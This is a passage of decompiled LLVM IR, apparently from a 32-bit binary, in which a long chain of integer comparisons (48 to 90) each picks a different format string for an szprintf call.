  %v4_10004300 = zext i8 %v3_10004300 to i32
  %v4_10004330 = call i32 @szprintf(i32 %v2_100042ec, i32 ptrtoint ([13 x i8]* @global_var_10013f44.103 to i32), i32 %v4_10004300)
  br label %dec_label_pc_10004334

dec_label_pc_10004334:                            ; preds = %dec_label_pc_100042e0, %dec_label_pc_100042ec
  %v3_10004338 = icmp eq i32 %v2_10003364, 48
  br i1 %v3_10004338, label %dec_label_pc_10004340, label %dec_label_pc_10004388

dec_label_pc_10004340:                            ; preds = %dec_label_pc_10004334
  %v2_10004340 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004354 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004354 = zext i8 %v3_10004354 to i32
  %v4_10004384 = call i32 @szprintf(i32 %v2_10004340, i32 ptrtoint ([12 x i8]* @global_var_10013f54.104 to i32), i32 %v4_10004354)
  br label %dec_label_pc_10004388

dec_label_pc_10004388:                            ; preds = %dec_label_pc_10004334, %dec_label_pc_10004340
  %v3_1000438c = icmp eq i32 %v2_10003364, 49
  br i1 %v3_1000438c, label %dec_label_pc_10004394, label %dec_label_pc_100043dc

dec_label_pc_10004394:                            ; preds = %dec_label_pc_10004388
  %v2_10004394 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043a8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100043a8 = zext i8 %v3_100043a8 to i32
  %v4_100043d8 = call i32 @szprintf(i32 %v2_10004394, i32 ptrtoint ([12 x i8]* @global_var_10013f60.105 to i32), i32 %v4_100043a8)
  br label %dec_label_pc_100043dc

dec_label_pc_100043dc:                            ; preds = %dec_label_pc_10004388, %dec_label_pc_10004394
  %v3_100043e0 = icmp eq i32 %v2_10003364, 50
  br i1 %v3_100043e0, label %dec_label_pc_100043e8, label %dec_label_pc_10004430

dec_label_pc_100043e8:                            ; preds = %dec_label_pc_100043dc
  %v2_100043e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043fc = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100043fc = zext i8 %v3_100043fc to i32
  %v4_1000442c = call i32 @szprintf(i32 %v2_100043e8, i32 ptrtoint ([12 x i8]* @global_var_10013f6c.106 to i32), i32 %v4_100043fc)
  br label %dec_label_pc_10004430

dec_label_pc_10004430:                            ; preds = %dec_label_pc_100043dc, %dec_label_pc_100043e8
  %v3_10004434 = icmp eq i32 %v2_10003364, 51
  br i1 %v3_10004434, label %dec_label_pc_1000443c, label %dec_label_pc_10004484

dec_label_pc_1000443c:                            ; preds = %dec_label_pc_10004430
  %v2_1000443c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004450 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004450 = zext i8 %v3_10004450 to i32
  %v4_10004480 = call i32 @szprintf(i32 %v2_1000443c, i32 ptrtoint ([13 x i8]* @global_var_10013f78.107 to i32), i32 %v4_10004450)
  br label %dec_label_pc_10004484

dec_label_pc_10004484:                            ; preds = %dec_label_pc_10004430, %dec_label_pc_1000443c
  %v3_10004488 = icmp eq i32 %v2_10003364, 52
  br i1 %v3_10004488, label %dec_label_pc_10004490, label %dec_label_pc_100044d8

dec_label_pc_10004490:                            ; preds = %dec_label_pc_10004484
  %v2_10004490 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044a4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100044a4 = zext i8 %v3_100044a4 to i32
  %v4_100044d4 = call i32 @szprintf(i32 %v2_10004490, i32 ptrtoint ([13 x i8]* @global_var_10013f88.108 to i32), i32 %v4_100044a4)
  br label %dec_label_pc_100044d8

dec_label_pc_100044d8:                            ; preds = %dec_label_pc_10004484, %dec_label_pc_10004490
  %v3_100044dc = icmp eq i32 %v2_10003364, 53
  br i1 %v3_100044dc, label %dec_label_pc_100044e4, label %dec_label_pc_1000452c

dec_label_pc_100044e4:                            ; preds = %dec_label_pc_100044d8
  %v2_100044e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044f8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100044f8 = zext i8 %v3_100044f8 to i32
  %v4_10004528 = call i32 @szprintf(i32 %v2_100044e4, i32 ptrtoint ([14 x i8]* @global_var_10013f98.109 to i32), i32 %v4_100044f8)
  br label %dec_label_pc_1000452c

dec_label_pc_1000452c:                            ; preds = %dec_label_pc_100044d8, %dec_label_pc_100044e4
  %v3_10004530 = icmp eq i32 %v2_10003364, 54
  br i1 %v3_10004530, label %dec_label_pc_10004538, label %dec_label_pc_10004580

dec_label_pc_10004538:                            ; preds = %dec_label_pc_1000452c
  %v2_10004538 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000454c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000454c = zext i8 %v3_1000454c to i32
  %v4_1000457c = call i32 @szprintf(i32 %v2_10004538, i32 ptrtoint ([13 x i8]* @global_var_10013fa8.110 to i32), i32 %v4_1000454c)
  br label %dec_label_pc_10004580

dec_label_pc_10004580:                            ; preds = %dec_label_pc_1000452c, %dec_label_pc_10004538
  %v3_10004584 = icmp eq i32 %v2_10003364, 55
  br i1 %v3_10004584, label %dec_label_pc_1000458c, label %dec_label_pc_100045d4

dec_label_pc_1000458c:                            ; preds = %dec_label_pc_10004580
  %v2_1000458c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045a0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100045a0 = zext i8 %v3_100045a0 to i32
  %v4_100045d0 = call i32 @szprintf(i32 %v2_1000458c, i32 ptrtoint ([14 x i8]* @global_var_10013fb8.111 to i32), i32 %v4_100045a0)
  br label %dec_label_pc_100045d4

dec_label_pc_100045d4:                            ; preds = %dec_label_pc_10004580, %dec_label_pc_1000458c
  %v3_100045d8 = icmp eq i32 %v2_10003364, 56
  br i1 %v3_100045d8, label %dec_label_pc_100045e0, label %dec_label_pc_10004628

dec_label_pc_100045e0:                            ; preds = %dec_label_pc_100045d4
  %v2_100045e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045f4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100045f4 = zext i8 %v3_100045f4 to i32
  %v4_10004624 = call i32 @szprintf(i32 %v2_100045e0, i32 ptrtoint ([14 x i8]* @global_var_10013fc8.112 to i32), i32 %v4_100045f4)
  br label %dec_label_pc_10004628

dec_label_pc_10004628:                            ; preds = %dec_label_pc_100045d4, %dec_label_pc_100045e0
  %v3_1000462c = icmp eq i32 %v2_10003364, 57
  br i1 %v3_1000462c, label %dec_label_pc_10004634, label %dec_label_pc_1000467c

dec_label_pc_10004634:                            ; preds = %dec_label_pc_10004628
  %v2_10004634 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004648 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004648 = zext i8 %v3_10004648 to i32
  %v4_10004678 = call i32 @szprintf(i32 %v2_10004634, i32 ptrtoint ([13 x i8]* @global_var_10013fd8.113 to i32), i32 %v4_10004648)
  br label %dec_label_pc_1000467c

dec_label_pc_1000467c:                            ; preds = %dec_label_pc_10004628, %dec_label_pc_10004634
  %v3_10004680 = icmp eq i32 %v2_10003364, 58
  br i1 %v3_10004680, label %dec_label_pc_10004688, label %dec_label_pc_100046d0

dec_label_pc_10004688:                            ; preds = %dec_label_pc_1000467c
  %v2_10004688 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000469c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000469c = zext i8 %v3_1000469c to i32
  %v4_100046cc = call i32 @szprintf(i32 %v2_10004688, i32 ptrtoint ([13 x i8]* @global_var_10013fe8.114 to i32), i32 %v4_1000469c)
  br label %dec_label_pc_100046d0

dec_label_pc_100046d0:                            ; preds = %dec_label_pc_1000467c, %dec_label_pc_10004688
  %v3_100046d4 = icmp eq i32 %v2_10003364, 59
  br i1 %v3_100046d4, label %dec_label_pc_100046dc, label %dec_label_pc_10004724

dec_label_pc_100046dc:                            ; preds = %dec_label_pc_100046d0
  %v2_100046dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100046f0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100046f0 = zext i8 %v3_100046f0 to i32
  %v4_10004720 = call i32 @szprintf(i32 %v2_100046dc, i32 ptrtoint ([13 x i8]* @global_var_10013ff8.115 to i32), i32 %v4_100046f0)
  br label %dec_label_pc_10004724

dec_label_pc_10004724:                            ; preds = %dec_label_pc_100046d0, %dec_label_pc_100046dc
  %v3_10004728 = icmp eq i32 %v2_10003364, 60
  br i1 %v3_10004728, label %dec_label_pc_10004730, label %dec_label_pc_10004778

dec_label_pc_10004730:                            ; preds = %dec_label_pc_10004724
  %v2_10004730 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004744 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004744 = zext i8 %v3_10004744 to i32
  %v4_10004774 = call i32 @szprintf(i32 %v2_10004730, i32 ptrtoint ([13 x i8]* @global_var_10014008.116 to i32), i32 %v4_10004744)
  br label %dec_label_pc_10004778

dec_label_pc_10004778:                            ; preds = %dec_label_pc_10004724, %dec_label_pc_10004730
  %v3_1000477c = icmp eq i32 %v2_10003364, 61
  br i1 %v3_1000477c, label %dec_label_pc_10004784, label %dec_label_pc_100047cc

dec_label_pc_10004784:                            ; preds = %dec_label_pc_10004778
  %v2_10004784 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004798 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004798 = zext i8 %v3_10004798 to i32
  %v4_100047c8 = call i32 @szprintf(i32 %v2_10004784, i32 ptrtoint ([13 x i8]* @global_var_10014018.117 to i32), i32 %v4_10004798)
  br label %dec_label_pc_100047cc

dec_label_pc_100047cc:                            ; preds = %dec_label_pc_10004778, %dec_label_pc_10004784
  %v3_100047d0 = icmp eq i32 %v2_10003364, 62
  br i1 %v3_100047d0, label %dec_label_pc_100047d8, label %dec_label_pc_10004820

dec_label_pc_100047d8:                            ; preds = %dec_label_pc_100047cc
  %v2_100047d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100047ec = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100047ec = zext i8 %v3_100047ec to i32
  %v4_1000481c = call i32 @szprintf(i32 %v2_100047d8, i32 ptrtoint ([13 x i8]* @global_var_10014028.118 to i32), i32 %v4_100047ec)
  br label %dec_label_pc_10004820

dec_label_pc_10004820:                            ; preds = %dec_label_pc_100047cc, %dec_label_pc_100047d8
  %v3_10004824 = icmp eq i32 %v2_10003364, 63
  br i1 %v3_10004824, label %dec_label_pc_1000482c, label %dec_label_pc_10004874

dec_label_pc_1000482c:                            ; preds = %dec_label_pc_10004820
  %v2_1000482c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004840 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004840 = zext i8 %v3_10004840 to i32
  %v4_10004870 = call i32 @szprintf(i32 %v2_1000482c, i32 ptrtoint ([13 x i8]* @global_var_10014038.119 to i32), i32 %v4_10004840)
  br label %dec_label_pc_10004874

dec_label_pc_10004874:                            ; preds = %dec_label_pc_10004820, %dec_label_pc_1000482c
  %v3_10004878 = icmp eq i32 %v2_10003364, 64
  br i1 %v3_10004878, label %dec_label_pc_10004880, label %dec_label_pc_100048c8

dec_label_pc_10004880:                            ; preds = %dec_label_pc_10004874
  %v2_10004880 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004894 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004894 = zext i8 %v3_10004894 to i32
  %v4_100048c4 = call i32 @szprintf(i32 %v2_10004880, i32 ptrtoint ([13 x i8]* @global_var_10014048.120 to i32), i32 %v4_10004894)
  br label %dec_label_pc_100048c8

dec_label_pc_100048c8:                            ; preds = %dec_label_pc_10004874, %dec_label_pc_10004880
  %v3_100048cc = icmp eq i32 %v2_10003364, 65
  br i1 %v3_100048cc, label %dec_label_pc_100048d4, label %dec_label_pc_1000491c

dec_label_pc_100048d4:                            ; preds = %dec_label_pc_100048c8
  %v2_100048d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100048e8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100048e8 = zext i8 %v3_100048e8 to i32
  %v4_10004918 = call i32 @szprintf(i32 %v2_100048d4, i32 ptrtoint ([13 x i8]* @global_var_10014058.121 to i32), i32 %v4_100048e8)
  br label %dec_label_pc_1000491c

dec_label_pc_1000491c:                            ; preds = %dec_label_pc_100048c8, %dec_label_pc_100048d4
  %v3_10004920 = icmp eq i32 %v2_10003364, 66
  br i1 %v3_10004920, label %dec_label_pc_10004928, label %dec_label_pc_10004970

dec_label_pc_10004928:                            ; preds = %dec_label_pc_1000491c
  %v2_10004928 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000493c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000493c = zext i8 %v3_1000493c to i32
  %v4_1000496c = call i32 @szprintf(i32 %v2_10004928, i32 ptrtoint ([13 x i8]* @global_var_10014068.122 to i32), i32 %v4_1000493c)
  br label %dec_label_pc_10004970

dec_label_pc_10004970:                            ; preds = %dec_label_pc_1000491c, %dec_label_pc_10004928
  %v3_10004974 = icmp eq i32 %v2_10003364, 67
  br i1 %v3_10004974, label %dec_label_pc_1000497c, label %dec_label_pc_100049c4

dec_label_pc_1000497c:                            ; preds = %dec_label_pc_10004970
  %v2_1000497c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004990 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004990 = zext i8 %v3_10004990 to i32
  %v4_100049c0 = call i32 @szprintf(i32 %v2_1000497c, i32 ptrtoint ([13 x i8]* @global_var_10014078.123 to i32), i32 %v4_10004990)
  br label %dec_label_pc_100049c4

dec_label_pc_100049c4:                            ; preds = %dec_label_pc_10004970, %dec_label_pc_1000497c
  %v3_100049c8 = icmp eq i32 %v2_10003364, 68
  br i1 %v3_100049c8, label %dec_label_pc_100049d0, label %dec_label_pc_10004a18

dec_label_pc_100049d0:                            ; preds = %dec_label_pc_100049c4
  %v2_100049d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100049e4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100049e4 = zext i8 %v3_100049e4 to i32
  %v4_10004a14 = call i32 @szprintf(i32 %v2_100049d0, i32 ptrtoint ([13 x i8]* @global_var_10014088.124 to i32), i32 %v4_100049e4)
  br label %dec_label_pc_10004a18

dec_label_pc_10004a18:                            ; preds = %dec_label_pc_100049c4, %dec_label_pc_100049d0
  %v3_10004a1c = icmp eq i32 %v2_10003364, 69
  br i1 %v3_10004a1c, label %dec_label_pc_10004a24, label %dec_label_pc_10004a6c

dec_label_pc_10004a24:                            ; preds = %dec_label_pc_10004a18
  %v2_10004a24 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a38 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004a38 = zext i8 %v3_10004a38 to i32
  %v4_10004a68 = call i32 @szprintf(i32 %v2_10004a24, i32 ptrtoint ([13 x i8]* @global_var_10014098.125 to i32), i32 %v4_10004a38)
  br label %dec_label_pc_10004a6c

dec_label_pc_10004a6c:                            ; preds = %dec_label_pc_10004a18, %dec_label_pc_10004a24
  %v3_10004a70 = icmp eq i32 %v2_10003364, 70
  br i1 %v3_10004a70, label %dec_label_pc_10004a78, label %dec_label_pc_10004ac0

dec_label_pc_10004a78:                            ; preds = %dec_label_pc_10004a6c
  %v2_10004a78 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a8c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004a8c = zext i8 %v3_10004a8c to i32
  %v4_10004abc = call i32 @szprintf(i32 %v2_10004a78, i32 ptrtoint ([13 x i8]* @global_var_100140a8.126 to i32), i32 %v4_10004a8c)
  br label %dec_label_pc_10004ac0

dec_label_pc_10004ac0:                            ; preds = %dec_label_pc_10004a6c, %dec_label_pc_10004a78
  %v3_10004ac4 = icmp eq i32 %v2_10003364, 71
  br i1 %v3_10004ac4, label %dec_label_pc_10004acc, label %dec_label_pc_10004b14

dec_label_pc_10004acc:                            ; preds = %dec_label_pc_10004ac0
  %v2_10004acc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ae0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004ae0 = zext i8 %v3_10004ae0 to i32
  %v4_10004b10 = call i32 @szprintf(i32 %v2_10004acc, i32 ptrtoint ([13 x i8]* @global_var_100140b8.127 to i32), i32 %v4_10004ae0)
  br label %dec_label_pc_10004b14

dec_label_pc_10004b14:                            ; preds = %dec_label_pc_10004ac0, %dec_label_pc_10004acc
  %v3_10004b18 = icmp eq i32 %v2_10003364, 72
  br i1 %v3_10004b18, label %dec_label_pc_10004b20, label %dec_label_pc_10004b68

dec_label_pc_10004b20:                            ; preds = %dec_label_pc_10004b14
  %v2_10004b20 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b34 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004b34 = zext i8 %v3_10004b34 to i32
  %v4_10004b64 = call i32 @szprintf(i32 %v2_10004b20, i32 ptrtoint ([13 x i8]* @global_var_100140c8.128 to i32), i32 %v4_10004b34)
  br label %dec_label_pc_10004b68

dec_label_pc_10004b68:                            ; preds = %dec_label_pc_10004b14, %dec_label_pc_10004b20
  %v3_10004b6c = icmp eq i32 %v2_10003364, 73
  br i1 %v3_10004b6c, label %dec_label_pc_10004b74, label %dec_label_pc_10004bbc

dec_label_pc_10004b74:                            ; preds = %dec_label_pc_10004b68
  %v2_10004b74 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b88 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004b88 = zext i8 %v3_10004b88 to i32
  %v4_10004bb8 = call i32 @szprintf(i32 %v2_10004b74, i32 ptrtoint ([13 x i8]* @global_var_100140d8.129 to i32), i32 %v4_10004b88)
  br label %dec_label_pc_10004bbc

dec_label_pc_10004bbc:                            ; preds = %dec_label_pc_10004b68, %dec_label_pc_10004b74
  %v3_10004bc0 = icmp eq i32 %v2_10003364, 74
  br i1 %v3_10004bc0, label %dec_label_pc_10004bc8, label %dec_label_pc_10004c10

dec_label_pc_10004bc8:                            ; preds = %dec_label_pc_10004bbc
  %v2_10004bc8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004bdc = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004bdc = zext i8 %v3_10004bdc to i32
  %v4_10004c0c = call i32 @szprintf(i32 %v2_10004bc8, i32 ptrtoint ([13 x i8]* @global_var_100140e8.130 to i32), i32 %v4_10004bdc)
  br label %dec_label_pc_10004c10

dec_label_pc_10004c10:                            ; preds = %dec_label_pc_10004bbc, %dec_label_pc_10004bc8
  %v3_10004c14 = icmp eq i32 %v2_10003364, 75
  br i1 %v3_10004c14, label %dec_label_pc_10004c1c, label %dec_label_pc_10004c64

dec_label_pc_10004c1c:                            ; preds = %dec_label_pc_10004c10
  %v2_10004c1c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c30 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004c30 = zext i8 %v3_10004c30 to i32
  %v4_10004c60 = call i32 @szprintf(i32 %v2_10004c1c, i32 ptrtoint ([13 x i8]* @global_var_100140f8.131 to i32), i32 %v4_10004c30)
  br label %dec_label_pc_10004c64

dec_label_pc_10004c64:                            ; preds = %dec_label_pc_10004c10, %dec_label_pc_10004c1c
  %v3_10004c68 = icmp eq i32 %v2_10003364, 76
  br i1 %v3_10004c68, label %dec_label_pc_10004c70, label %dec_label_pc_10004cb8

dec_label_pc_10004c70:                            ; preds = %dec_label_pc_10004c64
  %v2_10004c70 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c84 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004c84 = zext i8 %v3_10004c84 to i32
  %v4_10004cb4 = call i32 @szprintf(i32 %v2_10004c70, i32 ptrtoint ([13 x i8]* @global_var_10014108.132 to i32), i32 %v4_10004c84)
  br label %dec_label_pc_10004cb8

dec_label_pc_10004cb8:                            ; preds = %dec_label_pc_10004c64, %dec_label_pc_10004c70
  %v3_10004cbc = icmp eq i32 %v2_10003364, 77
  br i1 %v3_10004cbc, label %dec_label_pc_10004cc4, label %dec_label_pc_10004d0c

dec_label_pc_10004cc4:                            ; preds = %dec_label_pc_10004cb8
  %v2_10004cc4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004cd8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004cd8 = zext i8 %v3_10004cd8 to i32
  %v4_10004d08 = call i32 @szprintf(i32 %v2_10004cc4, i32 ptrtoint ([13 x i8]* @global_var_10014118.133 to i32), i32 %v4_10004cd8)
  br label %dec_label_pc_10004d0c

dec_label_pc_10004d0c:                            ; preds = %dec_label_pc_10004cb8, %dec_label_pc_10004cc4
  %v3_10004d10 = icmp eq i32 %v2_10003364, 78
  br i1 %v3_10004d10, label %dec_label_pc_10004d18, label %dec_label_pc_10004d60

dec_label_pc_10004d18:                            ; preds = %dec_label_pc_10004d0c
  %v2_10004d18 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d2c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004d2c = zext i8 %v3_10004d2c to i32
  %v4_10004d5c = call i32 @szprintf(i32 %v2_10004d18, i32 ptrtoint ([13 x i8]* @global_var_10014128.134 to i32), i32 %v4_10004d2c)
  br label %dec_label_pc_10004d60

dec_label_pc_10004d60:                            ; preds = %dec_label_pc_10004d0c, %dec_label_pc_10004d18
  %v3_10004d64 = icmp eq i32 %v2_10003364, 79
  br i1 %v3_10004d64, label %dec_label_pc_10004d6c, label %dec_label_pc_10004db4

dec_label_pc_10004d6c:                            ; preds = %dec_label_pc_10004d60
  %v2_10004d6c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d80 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004d80 = zext i8 %v3_10004d80 to i32
  %v4_10004db0 = call i32 @szprintf(i32 %v2_10004d6c, i32 ptrtoint ([13 x i8]* @global_var_10014138.135 to i32), i32 %v4_10004d80)
  br label %dec_label_pc_10004db4

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004d60, %dec_label_pc_10004d6c
  %v3_10004db8 = icmp eq i32 %v2_10003364, 80
  br i1 %v3_10004db8, label %dec_label_pc_10004dc0, label %dec_label_pc_10004e08

dec_label_pc_10004dc0:                            ; preds = %dec_label_pc_10004db4
  %v2_10004dc0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004dd4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004dd4 = zext i8 %v3_10004dd4 to i32
  %v4_10004e04 = call i32 @szprintf(i32 %v2_10004dc0, i32 ptrtoint ([13 x i8]* @global_var_10014148.136 to i32), i32 %v4_10004dd4)
  br label %dec_label_pc_10004e08

dec_label_pc_10004e08:                            ; preds = %dec_label_pc_10004db4, %dec_label_pc_10004dc0
  %v3_10004e0c = icmp eq i32 %v2_10003364, 81
  br i1 %v3_10004e0c, label %dec_label_pc_10004e14, label %dec_label_pc_10004e5c

dec_label_pc_10004e14:                            ; preds = %dec_label_pc_10004e08
  %v2_10004e14 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e28 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004e28 = zext i8 %v3_10004e28 to i32
  %v4_10004e58 = call i32 @szprintf(i32 %v2_10004e14, i32 ptrtoint ([13 x i8]* @global_var_10014158.137 to i32), i32 %v4_10004e28)
  br label %dec_label_pc_10004e5c

dec_label_pc_10004e5c:                            ; preds = %dec_label_pc_10004e08, %dec_label_pc_10004e14
  %v3_10004e60 = icmp eq i32 %v2_10003364, 82
  br i1 %v3_10004e60, label %dec_label_pc_10004e68, label %dec_label_pc_10004eb0

dec_label_pc_10004e68:                            ; preds = %dec_label_pc_10004e5c
  %v2_10004e68 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e7c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004e7c = zext i8 %v3_10004e7c to i32
  %v4_10004eac = call i32 @szprintf(i32 %v2_10004e68, i32 ptrtoint ([13 x i8]* @global_var_10014168.138 to i32), i32 %v4_10004e7c)
  br label %dec_label_pc_10004eb0

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004e5c, %dec_label_pc_10004e68
  %v3_10004eb4 = icmp eq i32 %v2_10003364, 83
  br i1 %v3_10004eb4, label %dec_label_pc_10004ebc, label %dec_label_pc_10004f04

dec_label_pc_10004ebc:                            ; preds = %dec_label_pc_10004eb0
  %v2_10004ebc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ed0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004ed0 = zext i8 %v3_10004ed0 to i32
  %v4_10004f00 = call i32 @szprintf(i32 %v2_10004ebc, i32 ptrtoint ([13 x i8]* @global_var_10014178.139 to i32), i32 %v4_10004ed0)
  br label %dec_label_pc_10004f04

dec_label_pc_10004f04:                            ; preds = %dec_label_pc_10004eb0, %dec_label_pc_10004ebc
  %v3_10004f08 = icmp eq i32 %v2_10003364, 84
  br i1 %v3_10004f08, label %dec_label_pc_10004f10, label %dec_label_pc_10004f58

dec_label_pc_10004f10:                            ; preds = %dec_label_pc_10004f04
  %v2_10004f10 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f24 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004f24 = zext i8 %v3_10004f24 to i32
  %v4_10004f54 = call i32 @szprintf(i32 %v2_10004f10, i32 ptrtoint ([13 x i8]* @global_var_10014188.140 to i32), i32 %v4_10004f24)
  br label %dec_label_pc_10004f58

dec_label_pc_10004f58:                            ; preds = %dec_label_pc_10004f04, %dec_label_pc_10004f10
  %v3_10004f5c = icmp eq i32 %v2_10003364, 85
  br i1 %v3_10004f5c, label %dec_label_pc_10004f64, label %dec_label_pc_10004fac

dec_label_pc_10004f64:                            ; preds = %dec_label_pc_10004f58
  %v2_10004f64 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f78 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004f78 = zext i8 %v3_10004f78 to i32
  %v4_10004fa8 = call i32 @szprintf(i32 %v2_10004f64, i32 ptrtoint ([13 x i8]* @global_var_10014198.141 to i32), i32 %v4_10004f78)
  br label %dec_label_pc_10004fac

dec_label_pc_10004fac:                            ; preds = %dec_label_pc_10004f58, %dec_label_pc_10004f64
  %v3_10004fb0 = icmp eq i32 %v2_10003364, 86
  br i1 %v3_10004fb0, label %dec_label_pc_10004fb8, label %dec_label_pc_10005000

dec_label_pc_10004fb8:                            ; preds = %dec_label_pc_10004fac
  %v2_10004fb8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004fcc = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004fcc = zext i8 %v3_10004fcc to i32
  %v4_10004ffc = call i32 @szprintf(i32 %v2_10004fb8, i32 ptrtoint ([13 x i8]* @global_var_100141a8.142 to i32), i32 %v4_10004fcc)
  br label %dec_label_pc_10005000

dec_label_pc_10005000:                            ; preds = %dec_label_pc_10004fac, %dec_label_pc_10004fb8
  %v3_10005004 = icmp eq i32 %v2_10003364, 87
  br i1 %v3_10005004, label %dec_label_pc_1000500c, label %dec_label_pc_10005054

dec_label_pc_1000500c:                            ; preds = %dec_label_pc_10005000
  %v2_1000500c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005020 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005020 = zext i8 %v3_10005020 to i32
  %v4_10005050 = call i32 @szprintf(i32 %v2_1000500c, i32 ptrtoint ([13 x i8]* @global_var_100141b8.143 to i32), i32 %v4_10005020)
  br label %dec_label_pc_10005054

dec_label_pc_10005054:                            ; preds = %dec_label_pc_10005000, %dec_label_pc_1000500c
  %v3_10005058 = icmp eq i32 %v2_10003364, 88
  br i1 %v3_10005058, label %dec_label_pc_10005060, label %dec_label_pc_100050a8

dec_label_pc_10005060:                            ; preds = %dec_label_pc_10005054
  %v2_10005060 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005074 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005074 = zext i8 %v3_10005074 to i32
  %v4_100050a4 = call i32 @szprintf(i32 %v2_10005060, i32 ptrtoint ([13 x i8]* @global_var_100141c8.144 to i32), i32 %v4_10005074)
  br label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10005054, %dec_label_pc_10005060
  %v3_100050ac = icmp eq i32 %v2_10003364, 89
  br i1 %v3_100050ac, label %dec_label_pc_100050b4, label %dec_label_pc_100050fc

dec_label_pc_100050b4:                            ; preds = %dec_label_pc_100050a8
  %v2_100050b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100050c8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100050c8 = zext i8 %v3_100050c8 to i32
  %v4_100050f8 = call i32 @szprintf(i32 %v2_100050b4, i32 ptrtoint ([13 x i8]* @global_var_100141d8.145 to i32), i32 %v4_100050c8)
  br label %dec_label_pc_100050fc

dec_label_pc_100050fc:                            ; preds = %dec_label_pc_100050a8, %dec_label_pc_100050b4
  %v3_10005100 = icmp eq i32 %v2_10003364, 90
  br i1 %v3_10005100, label %dec_label_pc_10005108, label %dec_label_pc_10005150

dec_label_pc_10005108:                            ; preds = %dec_label_pc_100050fc
  %v2_10005108 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000511c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000511c = zext i8 %v3_1000511c to i32
  %v4_1000514c = call i32 @szprintf(i32 %v2_10005108, i32 ptrtoint ([13 x i8]* @global_var_100141e8.146 to i32), i32 %v4_1000511c)
  br label %dec_label_pc_10005150

